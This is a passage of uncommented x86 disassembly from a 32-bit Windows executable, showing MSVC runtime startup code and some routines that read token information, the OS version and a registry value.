  403d6e:	int3   
  403d6f:	int3   
  403d70:	mov    edi,edi
  403d72:	push   ebp
  403d73:	mov    ebp,esp
  403d75:	push   esi
  403d76:	mov    esi,ecx
  403d78:	call   0x403d97
  403d7d:	test   BYTE PTR [ebp+0x8],0x1
  403d81:	je     0x403d8b
  403d83:	push   esi
  403d84:	call   DWORD PTR ds:0x4070bc
  403d8a:	pop    ecx
  403d8b:	mov    eax,esi
  403d8d:	pop    esi
  403d8e:	pop    ebp
  403d8f:	ret    0x4
  403d92:	int3   
  403d93:	int3   
  403d94:	int3   
  403d95:	int3   
  403d96:	int3   
  403d97:	mov    edi,edi
  403d99:	push   ebp
  403d9a:	mov    ebp,esp
  403d9c:	push   ecx
  403d9d:	mov    eax,ds:0x406004
  403da2:	xor    eax,ebp
  403da4:	mov    DWORD PTR [ebp-0x4],eax
  403da7:	push   ebx
  403da8:	push   esi
  403da9:	push   edi
  403daa:	mov    edi,ecx
  403dac:	mov    DWORD PTR [edi],0x401ff4
  403db2:	lea    ecx,[edi+0x8]
  403db5:	xor    eax,eax
  403db7:	mov    edx,ecx
  403db9:	cmp    DWORD PTR [edx],eax
  403dbb:	je     0x403dcc
  403dbd:	test   eax,eax
  403dbf:	je     0x403de6
  403dc1:	mov    edx,DWORD PTR [edx]
  403dc3:	add    edx,0x4
  403dc6:	inc    eax
  403dc7:	cmp    DWORD PTR [edx],0x0
  403dca:	jne    0x403dbd
  403dcc:	xor    ebx,ebx
  403dce:	test   ebx,ebx
  403dd0:	je     0x403df2
  403dd2:	mov    eax,DWORD PTR [ebx]
  403dd4:	push   0x1
  403dd6:	mov    esi,DWORD PTR [eax]
  403dd8:	mov    ecx,esi
  403dda:	call   DWORD PTR ds:0x40717c
  403de0:	mov    ecx,ebx
  403de2:	call   esi
  403de4:	jmp    0x403db2
  403de6:	mov    ebx,DWORD PTR [edx]
  403de8:	mov    eax,DWORD PTR [ebx+0x4]
  403deb:	mov    DWORD PTR [edx],eax
  403ded:	dec    DWORD PTR [edi+0x4]
  403df0:	jmp    0x403dce
  403df2:	and    DWORD PTR [edi+0x4],0x0
  403df6:	and    DWORD PTR [ecx],0x0
  403df9:	mov    ecx,DWORD PTR [ebp-0x4]
  403dfc:	pop    edi
  403dfd:	pop    esi
  403dfe:	xor    ecx,ebp
  403e00:	pop    ebx
  403e01:	call   0x404560
  403e06:	mov    esp,ebp
  403e08:	pop    ebp
  403e09:	ret    
  403e0a:	int3   
  403e0b:	int3   
  403e0c:	int3   
  403e0d:	int3   
  403e0e:	int3   
  403e0f:	cmp    DWORD PTR [ecx],0x0
  403e12:	je     0x403e21
  403e14:	cmp    DWORD PTR [ecx],0xffffffff
  403e17:	je     0x403e21
  403e19:	push   DWORD PTR [ecx]
  403e1b:	call   DWORD PTR ds:0x40703c
  403e21:	ret    
  403e22:	int3   
  403e23:	int3   
  403e24:	int3   
  403e25:	int3   
  403e26:	int3   
  403e27:	push   0x18
  403e29:	mov    eax,0x405677
  403e2e:	call   0x405564
  403e33:	mov    DWORD PTR [ebp-0x18],ecx
  403e36:	xor    esi,esi
  403e38:	mov    eax,esi
  403e3a:	mov    DWORD PTR [ebp-0x10],eax
  403e3d:	mov    DWORD PTR [ebp-0x4],esi
  403e40:	test   ecx,ecx
  403e42:	je     0x403eea
  403e48:	lea    eax,[ebp-0x10]
  403e4b:	push   eax
  403e4c:	push   0x18
  403e4e:	call   DWORD PTR ds:0x407050
  403e54:	push   eax
  403e55:	call   DWORD PTR ds:0x407020
  403e5b:	test   eax,eax
  403e5d:	je     0x403ee7
  403e63:	lea    eax,[ebp-0x14]
  403e66:	mov    DWORD PTR [ebp-0x14],esi
  403e69:	push   eax
  403e6a:	push   esi
  403e6b:	push   esi
  403e6c:	push   0x19
  403e6e:	push   DWORD PTR [ebp-0x10]
  403e71:	call   DWORD PTR ds:0x407014
  403e77:	cmp    DWORD PTR [ebp-0x14],esi
  403e7a:	je     0x403ee7
  403e7c:	mov    DWORD PTR [ebp-0x24],esi
  403e7f:	mov    DWORD PTR [ebp-0x20],esi
  403e82:	mov    DWORD PTR [ebp-0x1c],esi
  403e85:	mov    BYTE PTR [ebp-0x4],0x1
  403e89:	lea    ecx,[ebp-0x24]
  403e8c:	push   DWORD PTR [ebp-0x14]
  403e8f:	call   0x40387e
  403e94:	mov    edi,DWORD PTR [ebp-0x24]
  403e97:	lea    eax,[ebp-0x14]
  403e9a:	push   eax
  403e9b:	push   DWORD PTR [ebp-0x14]
  403e9e:	push   edi
  403e9f:	push   0x19
  403ea1:	push   DWORD PTR [ebp-0x10]
  403ea4:	call   DWORD PTR ds:0x407014
  403eaa:	test   eax,eax
  403eac:	je     0x403edb
  403eae:	test   edi,edi
  403eb0:	je     0x403ee7
  403eb2:	mov    ebx,DWORD PTR [edi]
  403eb4:	push   ebx
  403eb5:	call   DWORD PTR ds:0x407010
  403ebb:	test   eax,eax
  403ebd:	je     0x403edb
  403ebf:	push   ebx
  403ec0:	call   DWORD PTR ds:0x407018
  403ec6:	cmp    BYTE PTR [eax],0x1
  403ec9:	jb     0x403edb
  403ecb:	push   esi
  403ecc:	push   ebx
  403ecd:	call   DWORD PTR ds:0x40701c
  403ed3:	mov    ecx,DWORD PTR [ebp-0x18]
  403ed6:	inc    esi
  403ed7:	mov    eax,DWORD PTR [eax]
  403ed9:	mov    DWORD PTR [ecx],eax
  403edb:	test   edi,edi
  403edd:	je     0x403ee7
  403edf:	push   edi
  403ee0:	call   DWORD PTR ds:0x4070bc
  403ee6:	pop    ecx
  403ee7:	mov    eax,DWORD PTR [ebp-0x10]
  403eea:	test   eax,eax
  403eec:	je     0x403efa
  403eee:	cmp    eax,0xffffffff
  403ef1:	je     0x403efa
  403ef3:	push   eax
  403ef4:	call   DWORD PTR ds:0x40703c
  403efa:	mov    eax,esi
  403efc:	call   0x405537
  403f01:	ret    
  403f02:	int3   
  403f03:	int3   
  403f04:	int3   
  403f05:	int3   
  403f06:	int3   
  403f07:	mov    edi,edi
  403f09:	push   ebp
  403f0a:	mov    ebp,esp
  403f0c:	push   ecx
  403f0d:	and    DWORD PTR [ebp-0x4],0x0
  403f11:	lea    ecx,[ebp-0x4]
  403f14:	call   0x403e27
  403f19:	test   eax,eax
  403f1b:	je     0x403f28
  403f1d:	cmp    DWORD PTR [ebp-0x4],0x2000
  403f24:	sbb    eax,eax
  403f26:	neg    eax
  403f28:	mov    esp,ebp
  403f2a:	pop    ebp
  403f2b:	ret    
  403f2c:	int3   
  403f2d:	int3   
  403f2e:	int3   
  403f2f:	int3   
  403f30:	int3   
  403f31:	mov    edi,edi
  403f33:	push   ebp
  403f34:	mov    ebp,esp
  403f36:	sub    esp,0x138
  403f3c:	mov    eax,ds:0x406004
  403f41:	xor    eax,ebp
  403f43:	mov    DWORD PTR [ebp-0x4],eax
  403f46:	push   esi
  403f47:	push   edi
  403f48:	lea    eax,[ebp-0x128]
  403f4e:	mov    DWORD PTR [ebp-0x128],0x11c
  403f58:	push   eax
  403f59:	call   DWORD PTR ds:0x407040
  403f5f:	test   eax,eax
  403f61:	setne  al
  403f64:	mov    BYTE PTR [ebp-0xc],al
  403f67:	test   al,al
  403f69:	je     0x403ff5
  403f6f:	cmp    DWORD PTR [ebp-0x124],0x6
  403f76:	jb     0x403ff5
  403f78:	lea    eax,[ebp-0x12c]
  403f7e:	xor    edi,edi
  403f80:	push   eax
  403f81:	push   0x20019
  403f86:	push   edi
  403f87:	push   0x402108
  403f8c:	xor    esi,esi
  403f8e:	mov    DWORD PTR [ebp-0x12c],edi
  403f94:	push   0x80000002
  403f99:	inc    esi
  403f9a:	call   DWORD PTR ds:0x40702c
  403fa0:	test   eax,eax
  403fa2:	jne    0x403ff1
  403fa4:	lea    eax,[ebp-0x134]
  403faa:	mov    DWORD PTR [ebp-0x130],edi
  403fb0:	push   eax
  403fb1:	lea    eax,[ebp-0x130]
  403fb7:	mov    DWORD PTR [ebp-0x134],0x4
  403fc1:	push   eax
  403fc2:	push   edi
  403fc3:	push   edi
  403fc4:	push   0x40217c
  403fc9:	push   DWORD PTR [ebp-0x12c]
  403fcf:	call   DWORD PTR ds:0x407028
  403fd5:	test   eax,eax
  403fd7:	jne    0x403fe5
  403fd9:	mov    eax,DWORD PTR [ebp-0x130]
  403fdf:	neg    eax
  403fe1:	sbb    eax,eax
  403fe3:	and    esi,eax
  403fe5:	push   DWORD PTR [ebp-0x12c]
  403feb:	call   DWORD PTR ds:0x407024
  403ff1:	mov    eax,esi
  403ff3:	jmp    0x403ff7
  403ff5:	xor    eax,eax
  403ff7:	mov    ecx,DWORD PTR [ebp-0x4]
  403ffa:	pop    edi
  403ffb:	xor    ecx,ebp
  403ffd:	pop    esi
  403ffe:	call   0x404560
  404003:	mov    esp,ebp
  404005:	pop    ebp
  404006:	ret    
  404007:	int3   
  404008:	int3   
  404009:	int3   
  40400a:	int3   
  40400b:	int3   
  40400c:	push   0xffffffff
  40400e:	push   ecx
  40400f:	push   0x104
  404014:	push   0x406598
  404019:	call   DWORD PTR ds:0x407134
  40401f:	add    esp,0x10
  404022:	cmp    eax,0x50
  404025:	jne    0x40402d
  404027:	mov    eax,0x8007007a
  40402c:	ret    
  40402d:	xor    eax,eax
  40402f:	ret    
  404030:	int3   
  404031:	int3   
  404032:	int3   
  404033:	int3   
  404034:	int3   
  404035:	mov    edi,edi
  404037:	push   ebp
  404038:	mov    ebp,esp
  40403a:	sub    esp,0x29c
  404040:	mov    eax,ds:0x406004
  404045:	xor    eax,ebp
  404047:	mov    DWORD PTR [ebp-0x4],eax
  40404a:	push   ebx
  40404b:	push   esi
  40404c:	push   edi
  40404d:	push   0x40
  40404f:	lea    eax,[ebp-0x88]
  404055:	push   eax
  404056:	push   0x402008
  40405b:	call   DWORD PTR ds:0x407174
  404061:	test   eax,eax
  404063:	jne    0x40406d
  404065:	or     eax,0xffffffff
  404068:	jmp    0x4041d2
  40406d:	lea    eax,[ebp-0x88]
  404073:	push   eax
  404074:	push   0x402190
  404079:	lea    eax,[ebp-0x288]
  40407f:	push   0x100
  404084:	push   eax
  404085:	call   0x403a3a
  40408a:	add    esp,0x10
  40408d:	test   eax,eax
  40408f:	js     0x404065
  404091:	lea    eax,[ebp-0x28c]
  404097:	push   eax
  404098:	push   ecx
  404099:	push   ecx
  40409a:	lea    edx,[ebp-0x288]
  4040a0:	call   0x4037b9
  4040a5:	test   eax,eax
  4040a7:	jne    0x4041d2
  4040ad:	lea    eax,[ebp-0x294]
  4040b3:	mov    DWORD PTR [ebp-0x294],0x208
  4040bd:	push   eax
  4040be:	mov    ebx,0x406598
  4040c3:	lea    eax,[ebp-0x290]
  4040c9:	push   ebx
  4040ca:	push   eax
  4040cb:	push   0x0
  4040cd:	push   0x0
  4040cf:	push   DWORD PTR [ebp-0x28c]
  4040d5:	call   DWORD PTR ds:0x407028
  4040db:	mov    esi,eax
  4040dd:	test   esi,esi
  4040df:	jne    0x4041c4
  4040e5:	push   0x2
  4040e7:	pop    edx
  4040e8:	mov    edi,0x104
  4040ed:	cmp    DWORD PTR [ebp-0x290],edx
  4040f3:	jne    0x40414b
  4040f5:	xor    ecx,ecx
  4040f7:	mov    eax,edi
  4040f9:	mul    edx
  4040fb:	seto   cl
  4040fe:	neg    ecx
  404100:	or     ecx,eax
  404102:	push   ecx
  404103:	call   0x40546b
  404108:	pop    ecx
  404109:	push   edi
  40410a:	mov    esi,eax
  40410c:	push   esi
  40410d:	push   ebx
  40410e:	call   DWORD PTR ds:0x407038
  404114:	test   eax,eax
  404116:	je     0x40416b
  404118:	cmp    eax,edi
  40411a:	jae    0x40416b
  40411c:	mov    ecx,esi
  40411e:	call   0x403a6c
  404123:	cmp    eax,edi
  404125:	jb     0x404130
  404127:	mov    ecx,esi
  404129:	call   0x40400c
  40412e:	jmp    0x40413f
  404130:	push   eax
  404131:	push   esi
  404132:	push   edi
  404133:	push   ebx
  404134:	call   DWORD PTR ds:0x407134
  40413a:	add    esp,0x10
  40413d:	xor    eax,eax
  40413f:	push   esi
  404140:	test   eax,eax
  404142:	jne    0x40416c
  404144:	call   DWORD PTR ds:0x40713c
  40414a:	pop    ecx
  40414b:	xor    eax,eax
  40414d:	cmp    eax,ebx
  40414f:	je     0x404178
  404151:	push   edi
  404152:	push   ebx
  404153:	call   DWORD PTR ds:0x407138
  404159:	pop    ecx
  40415a:	pop    ecx
  40415b:	cmp    eax,edi
  40415d:	je     0x404178
  40415f:	lea    ecx,[ebp-0x298]
  404165:	test   ecx,ecx
  404167:	je     0x4041c2
  404169:	jmp    0x404184
  40416b:	push   esi
  40416c:	call   DWORD PTR ds:0x40713c
  404172:	pop    ecx
  404173:	or     esi,0xffffffff
  404176:	jmp    0x4041c4
  404178:	lea    eax,[ebp-0x298]
  40417e:	test   eax,eax
  404180:	je     0x4041c2
  404182:	xor    eax,eax
  404184:	test   eax,eax
  404186:	je     0x4041c2
  404188:	push   0x22
  40418a:	pop    ecx
  40418b:	cmp    WORD PTR ds:0x406598,cx
  404192:	jne    0x4041c2
  404194:	cmp    WORD PTR [eax*2+0x406596],cx
  40419c:	jne    0x4041c2
  40419e:	add    eax,0xfffffffe
  4041a1:	cmp    eax,edi
  4041a3:	jb     0x4041b1
  4041a5:	mov    ecx,0x40659a
  4041aa:	call   0x40400c
  4041af:	jmp    0x4041c2
  4041b1:	push   eax
  4041b2:	push   0x40659a
  4041b7:	push   edi
  4041b8:	push   ebx
  4041b9:	call   DWORD PTR ds:0x407134
  4041bf:	add    esp,0x10
  4041c2:	xor    esi,esi
  4041c4:	push   DWORD PTR [ebp-0x28c]
  4041ca:	call   DWORD PTR ds:0x407024
  4041d0:	mov    eax,esi
  4041d2:	mov    ecx,DWORD PTR [ebp-0x4]
  4041d5:	pop    edi
  4041d6:	pop    esi
  4041d7:	xor    ecx,ebp
  4041d9:	pop    ebx
  4041da:	call   0x404560
  4041df:	mov    esp,ebp
  4041e1:	pop    ebp
  4041e2:	ret    0x8
  4041e5:	int3   
  4041e6:	int3   
  4041e7:	int3   
  4041e8:	int3   
  4041e9:	int3   
  4041ea:	jmp    DWORD PTR ds:0x4070bc
  4041f0:	int3   
  4041f1:	int3   
  4041f2:	int3   
  4041f3:	int3   
  4041f4:	int3   
  4041f5:	int3   
  4041f6:	int3   
  4041f7:	int3   
  4041f8:	int3   
  4041f9:	int3   
  4041fa:	int3   
  4041fb:	int3   
  4041fc:	int3   
  4041fd:	int3   
  4041fe:	int3   
  4041ff:	int3   
  404200:	mov    eax,0x5a4d
  404205:	cmp    WORD PTR ds:0x400000,ax
  40420c:	je     0x404212
  40420e:	xor    eax,eax
  404210:	jmp    0x404260
  404212:	mov    ecx,DWORD PTR ds:0x40003c
  404218:	cmp    DWORD PTR [ecx+0x400000],0x4550
  404222:	jne    0x40420e
  404224:	movzx  eax,WORD PTR [ecx+0x400018]
  40422b:	cmp    eax,0x10b
  404230:	je     0x40424c
  404232:	cmp    eax,0x20b
  404237:	jne    0x40420e
  404239:	xor    eax,eax
  40423b:	cmp    DWORD PTR [ecx+0x400084],0xe
  404242:	jbe    0x404260
  404244:	cmp    DWORD PTR [ecx+0x4000f8],eax
  40424a:	jmp    0x40425d
  40424c:	xor    eax,eax
  40424e:	cmp    DWORD PTR [ecx+0x400074],0xe
  404255:	jbe    0x404260
  404257:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40425d:	setne  al
  404260:	push   0x2
  404262:	mov    ds:0x406184,eax
  404267:	call   0x40474e
  40426c:	push   eax
  40426d:	call   DWORD PTR ds:0x4070f8
  404273:	or     DWORD PTR ds:0x4067a8,0xffffffff
  40427a:	or     DWORD PTR ds:0x4067ac,0xffffffff
  404281:	pop    ecx
  404282:	pop    ecx
  404283:	call   DWORD PTR ds:0x4070e8
  404289:	mov    ecx,DWORD PTR ds:0x406198
  40428f:	mov    DWORD PTR [eax],ecx
  404291:	call   DWORD PTR ds:0x407104
  404297:	mov    ecx,DWORD PTR ds:0x40618c
  40429d:	mov    DWORD PTR [eax],ecx
  40429f:	call   0x4049a0
  4042a4:	cmp    DWORD PTR ds:0x406000,0x0
  4042ab:	jne    0x4042b9
  4042ad:	push   0x4049a0
  4042b2:	call   DWORD PTR ds:0x4070e4
  4042b8:	pop    ecx
  4042b9:	call   0x4049a8
  4042be:	xor    eax,eax
  4042c0:	ret    
  4042c1:	int3   
  4042c2:	int3   
  4042c3:	int3   
  4042c4:	int3   
  4042c5:	int3   
  4042c6:	int3   
  4042c7:	int3   
  4042c8:	int3   
  4042c9:	int3   
  4042ca:	int3   
  4042cb:	int3   
  4042cc:	int3   
  4042cd:	int3   
  4042ce:	int3   
  4042cf:	int3   
  4042d0:	mov    eax,ds:0x406194
  4042d5:	push   0x406188
  4042da:	push   DWORD PTR ds:0x406190
  4042e0:	mov    ds:0x406188,eax
  4042e5:	push   0x40617c
  4042ea:	push   0x406178
  4042ef:	push   0x406174
  4042f4:	call   DWORD PTR ds:0x4070fc
  4042fa:	add    esp,0x14
  4042fd:	mov    ds:0x406180,eax
  404302:	ret    
  404303:	int3   
  404304:	int3   
  404305:	int3   
  404306:	int3   
  404307:	int3   
  404308:	push   0x5c
  40430a:	push   0x405820
  40430f:	call   0x4049cc
  404314:	and    DWORD PTR [ebp-0x24],0x0
  404318:	and    DWORD PTR [ebp-0x4],0x0
  40431c:	lea    eax,[ebp-0x6c]
  40431f:	push   eax
  404320:	call   DWORD PTR ds:0x407074
  404326:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40432d:	xor    ebx,ebx
  40432f:	inc    ebx
  404330:	mov    DWORD PTR [ebp-0x4],ebx
  404333:	mov    eax,fs:0x18
  404339:	mov    edi,DWORD PTR [eax+0x4]
  40433c:	xor    esi,esi
  40433e:	mov    edx,0x4067a0
  404343:	mov    ecx,edi
  404345:	xor    eax,eax
  404347:	lock cmpxchg DWORD PTR [edx],ecx
  40434b:	test   eax,eax
  40434d:	je     0x404355
  40434f:	cmp    eax,edi
  404351:	jne    0x404367
  404353:	mov    esi,ebx
  404355:	cmp    DWORD PTR ds:0x4067a4,ebx
  40435b:	jne    0x404374
  40435d:	push   0x1f
  40435f:	call   0x40478a
  404364:	pop    ecx
  404365:	jmp    0x4043a3
  404367:	push   0x3e8
  40436c:	call   DWORD PTR ds:0x407078
  404372:	jmp    0x40433e
  404374:	cmp    DWORD PTR ds:0x4067a4,0x0
  40437b:	jne    0x40439d
  40437d:	mov    DWORD PTR ds:0x4067a4,ebx
  404383:	push   0x401034
  404388:	push   0x401028
  40438d:	call   0x4044f4
  404392:	pop    ecx
  404393:	pop    ecx
  404394:	test   eax,eax
  404396:	je     0x4043a3
  404398:	jmp    0x4044dd
  40439d:	mov    DWORD PTR ds:0x406170,ebx
  4043a3:	cmp    DWORD PTR ds:0x4067a4,ebx
  4043a9:	jne    0x4043c6
  4043ab:	push   0x401024
  4043b0:	push   0x401000
  4043b5:	call   0x4049c0
  4043ba:	pop    ecx
  4043bb:	pop    ecx
  4043bc:	mov    DWORD PTR ds:0x4067a4,0x2
  4043c6:	test   esi,esi
  4043c8:	jne    0x4043d3
  4043ca:	xor    eax,eax
  4043cc:	mov    ecx,0x4067a0
  4043d1:	xchg   DWORD PTR [ecx],eax
  4043d3:	cmp    DWORD PTR ds:0x4067b0,0x0
  4043da:	je     0x404401
  4043dc:	push   0x4067b0
  4043e1:	call   0x4047f0
  4043e6:	pop    ecx
  4043e7:	test   eax,eax
  4043e9:	je     0x404401
  4043eb:	push   0x0
  4043ed:	push   0x2
  4043ef:	push   0x0
  4043f1:	mov    esi,DWORD PTR ds:0x4067b0
  4043f7:	mov    ecx,esi
  4043f9:	call   DWORD PTR ds:0x40717c
  4043ff:	call   esi
  404401:	mov    eax,ds:0x4070dc
  404406:	mov    ecx,DWORD PTR [eax]
  404408:	test   ecx,ecx
  40440a:	je     0x4044dd
  404410:	mov    DWORD PTR [ebp-0x20],ecx
  404413:	push   0x20
  404415:	pop    esi
  404416:	mov    edx,DWORD PTR [ebp-0x24]
  404419:	movzx  eax,WORD PTR [ecx]
  40441c:	cmp    ax,si
  40441f:	ja     0x404471
  404421:	test   ax,ax
  404424:	je     0x40442a
  404426:	test   edx,edx
  404428:	jne    0x404471
  40442a:	movzx  eax,WORD PTR [ecx]
  40442d:	test   ax,ax
  404430:	je     0x40443f
  404432:	cmp    ax,si
  404435:	ja     0x40443f
  404437:	add    ecx,0x2
  40443a:	mov    DWORD PTR [ebp-0x20],ecx
  40443d:	jmp    0x40442a
  40443f:	test   BYTE PTR [ebp-0x40],0x1
  404443:	je     0x40444b
  404445:	movzx  eax,WORD PTR [ebp-0x3c]
  404449:	jmp    0x40444e
  40444b:	push   0xa
  40444d:	pop    eax
  40444e:	push   eax
  40444f:	push   ecx
  404450:	push   0x0
  404452:	push   0x400000
  404457:	call   0x402ed3
  40445c:	mov    ds:0x40616c,eax
  404461:	cmp    DWORD PTR ds:0x406184,0x0
  404468:	jne    0x4044b9
  40446a:	push   eax
  40446b:	call   DWORD PTR ds:0x4070f4
  404471:	cmp    eax,0x22
  404474:	jne    0x404482
  404476:	xor    eax,eax
  404478:	test   edx,edx
  40447a:	sete   al
  40447d:	mov    edx,eax
  40447f:	mov    DWORD PTR [ebp-0x24],edx
  404482:	add    ecx,0x2
  404485:	mov    DWORD PTR [ebp-0x20],ecx
  404488:	jmp    0x404419
  40448a:	mov    ecx,DWORD PTR [ebp-0x14]
  40448d:	mov    eax,DWORD PTR [ecx]
  40448f:	mov    eax,DWORD PTR [eax]
  404491:	mov    DWORD PTR [ebp-0x28],eax
  404494:	push   ecx
  404495:	push   eax
  404496:	call   0x4046d4
  40449b:	pop    ecx
  40449c:	pop    ecx
  40449d:	ret    
  40449e:	mov    esp,DWORD PTR [ebp-0x18]
  4044a1:	mov    eax,DWORD PTR [ebp-0x28]
  4044a4:	mov    ds:0x40616c,eax
  4044a9:	cmp    DWORD PTR ds:0x406184,0x0
  4044b0:	jne    0x4044b9
  4044b2:	push   eax
  4044b3:	call   DWORD PTR ds:0x4070f0
  4044b9:	cmp    DWORD PTR ds:0x406170,0x0
  4044c0:	jne    0x4044cd
  4044c2:	call   DWORD PTR ds:0x4070ec
  4044c8:	mov    eax,ds:0x40616c
  4044cd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4044d4:	jmp    0x4044e9
  4044d6:	xor    eax,eax
  4044d8:	inc    eax
  4044d9:	ret    
  4044da:	mov    esp,DWORD PTR [ebp-0x18]
  4044dd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4044e4:	mov    eax,0xff
  4044e9:	call   0x404a14
  4044ee:	ret    
  4044ef:	int3   
  4044f0:	int3   
  4044f1:	int3   
  4044f2:	int3   
  4044f3:	int3   
  4044f4:	mov    edi,edi
  4044f6:	push   ebp
  4044f7:	mov    ebp,esp
  4044f9:	push   ecx
  4044fa:	mov    eax,ds:0x406004
  4044ff:	xor    eax,ebp
  404501:	mov    DWORD PTR [ebp-0x4],eax
  404504:	push   esi
  404505:	mov    esi,DWORD PTR [ebp+0x8]
  404508:	xor    eax,eax
  40450a:	cmp    esi,DWORD PTR [ebp+0xc]
  40450d:	jae    0x40452d
  40450f:	push   edi
  404510:	test   eax,eax
  404512:	jne    0x40452c
  404514:	mov    edi,DWORD PTR [esi]
  404516:	test   edi,edi
  404518:	je     0x404524
  40451a:	mov    ecx,edi
  40451c:	call   DWORD PTR ds:0x40717c
  404522:	call   edi
  404524:	add    esi,0x4
  404527:	cmp    esi,DWORD PTR [ebp+0xc]
  40452a:	jb     0x404510
  40452c:	pop    edi
  40452d:	mov    ecx,DWORD PTR [ebp-0x4]
  404530:	xor    ecx,ebp
  404532:	pop    esi
  404533:	call   0x404560
  404538:	mov    esp,ebp
  40453a:	pop    ebp
  40453b:	ret    
  40453c:	int3   
  40453d:	int3   
  40453e:	int3   
  40453f:	int3   
  404540:	int3   
  404541:	int3   
  404542:	int3   
  404543:	int3   
  404544:	int3   
  404545:	int3   
  404546:	int3   
  404547:	int3   
  404548:	int3   
  404549:	int3   
  40454a:	int3   
  40454b:	int3   
  40454c:	int3   
  40454d:	int3   
  40454e:	int3   
  40454f:	int3   
  404550:	call   0x4048f8
  404555:	jmp    0x404308
  40455a:	int3   
  40455b:	int3   
  40455c:	int3   
  40455d:	int3   
  40455e:	int3   
  40455f:	int3   
  404560:	cmp    ecx,DWORD PTR ds:0x406004
  404566:	jne    0x40456b
  404568:	ret    0x0
  40456b:	jmp    0x404a89
  404570:	int3   
  404571:	int3   
  404572:	int3   
  404573:	int3   
  404574:	int3   
  404575:	push   0x18
  404577:	push   0x405848
  40457c:	call   0x4049cc
  404581:	and    DWORD PTR [ebp-0x28],0x0
  404585:	mov    eax,ds:0x4067ac
  40458a:	mov    DWORD PTR [ebp-0x20],eax
  40458d:	cmp    eax,0xffffffff
  404590:	jne    0x4045a8
  404592:	push   DWORD PTR [ebp+0x8]
  404595:	mov    esi,DWORD PTR ds:0x407118
  40459b:	mov    ecx,esi
  40459d:	call   DWORD PTR ds:0x40717c
  4045a3:	call   esi
  4045a5:	pop    ecx
  4045a6:	jmp    0x4045fc
  4045a8:	push   0x8
  4045aa:	call   0x404b9e
  4045af:	pop    ecx
  4045b0:	and    DWORD PTR [ebp-0x4],0x0
  4045b4:	mov    eax,ds:0x4067ac
  4045b9:	mov    DWORD PTR [ebp-0x20],eax
  4045bc:	mov    eax,ds:0x4067a8
  4045c1:	mov    DWORD PTR [ebp-0x24],eax
  4045c4:	lea    eax,[ebp-0x24]
  4045c7:	push   eax
  4045c8:	lea    eax,[ebp-0x20]
  4045cb:	push   eax
  4045cc:	push   DWORD PTR [ebp+0x8]
  4045cf:	call   0x404bb6
  4045d4:	add    esp,0xc
  4045d7:	mov    esi,eax
  4045d9:	mov    DWORD PTR [ebp-0x28],esi
  4045dc:	mov    ecx,DWORD PTR [ebp-0x20]
  4045df:	mov    DWORD PTR ds:0x4067ac,ecx
  4045e5:	mov    ecx,DWORD PTR [ebp-0x24]
  4045e8:	mov    DWORD PTR ds:0x4067a8,ecx
  4045ee:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4045f5:	call   0x404605
  4045fa:	mov    eax,esi
  4045fc:	call   0x404a14
  404601:	ret    
  404602:	mov    esi,DWORD PTR [ebp-0x28]
  404605:	push   0x8
  404607:	call   0x404baa
  40460c:	pop    ecx
  40460d:	ret    
  40460e:	int3   
  40460f:	int3   
  404610:	int3   
  404611:	int3   
  404612:	int3   
  404613:	mov    edi,edi
  404615:	push   ebp
  404616:	mov    ebp,esp
  404618:	push   DWORD PTR [ebp+0x8]
  40461b:	call   0x404575
  404620:	neg    eax
  404622:	pop    ecx
  404623:	sbb    eax,eax
  404625:	neg    eax
  404627:	dec    eax
  404628:	pop    ebp
  404629:	ret    
  40462a:	int3   
  40462b:	int3   
  40462c:	int3   
  40462d:	int3   
  40462e:	int3   
  40462f:	int3   
  404630:	mov    edi,edi
  404632:	push   ebp
  404633:	mov    ebp,esp
  404635:	push   esi
  404636:	mov    esi,ecx
  404638:	call   DWORD PTR ds:0x40711c
  40463e:	test   BYTE PTR [ebp+0x8],0x1
  404642:	je     0x40464b
  404644:	push   esi
  404645:	call   0x4041ea
  40464a:	pop    ecx
  40464b:	mov    eax,esi
  40464d:	pop    esi
  40464e:	pop    ebp
  40464f:	ret    0x4
  404652:	int3   
  404653:	int3   
  404654:	int3   
  404655:	int3   
  404656:	int3   
  404657:	int3   
  404658:	int3   
  404659:	int3   
  40465a:	int3   
  40465b:	int3   
  40465c:	int3   
  40465d:	int3   
  40465e:	int3   
  40465f:	int3   
  404660:	jmp    DWORD PTR ds:0x40710c
  404666:	int3   
  404667:	int3   
  404668:	int3   
  404669:	int3   
  40466a:	int3   
  40466b:	int3   
  40466c:	int3   
  40466d:	int3   
  40466e:	int3   
  40466f:	int3   
  404670:	mov    edi,edi
  404672:	push   ebp
  404673:	mov    ebp,esp
  404675:	mov    eax,DWORD PTR [ebp+0x8]
  404678:	mov    eax,DWORD PTR [eax]
  40467a:	cmp    DWORD PTR [eax],0xe06d7363
  404680:	jne    0x4046ad
  404682:	cmp    DWORD PTR [eax+0x10],0x3
  404686:	jne    0x4046ad
  404688:	mov    eax,DWORD PTR [eax+0x14]
  40468b:	cmp    eax,0x19930520
  404690:	je     0x4046a7
  404692:	cmp    eax,0x19930521
  404697:	je     0x4046a7
  404699:	cmp    eax,0x19930522
  40469e:	je     0x4046a7
  4046a0:	cmp    eax,0x1994000
  4046a5:	jne    0x4046ad
  4046a7:	call   DWORD PTR ds:0x407120
  4046ad:	xor    eax,eax
  4046af:	pop    ebp
  4046b0:	ret    0x4
  4046b3:	int3   
  4046b4:	int3   
  4046b5:	int3   
  4046b6:	int3   
  4046b7:	int3   
  4046b8:	int3   
  4046b9:	int3   
  4046ba:	int3   
  4046bb:	int3   
  4046bc:	int3   
  4046bd:	int3   
  4046be:	int3   
  4046bf:	int3   
  4046c0:	push   0x404670
  4046c5:	call   DWORD PTR ds:0x407070
  4046cb:	xor    eax,eax
  4046cd:	ret    
  4046ce:	int3   
  4046cf:	int3   
  4046d0:	int3   
  4046d1:	int3   
  4046d2:	int3   
  4046d3:	int3   
  4046d4:	jmp    DWORD PTR ds:0x407160
  4046da:	int3   
  4046db:	int3   
  4046dc:	int3   
  4046dd:	int3   
  4046de:	int3   
  4046df:	push   0xc
  4046e1:	push   0x405868
  4046e6:	call   0x404bc4
  4046eb:	xor    ecx,ecx
  4046ed:	mov    eax,DWORD PTR [ebp+0x8]
  4046f0:	test   eax,eax
  4046f2:	je     0x40473f
  4046f4:	cmp    eax,0xffffffff
  4046f7:	je     0x40473f
  4046f9:	mov    DWORD PTR [ebp-0x4],ecx
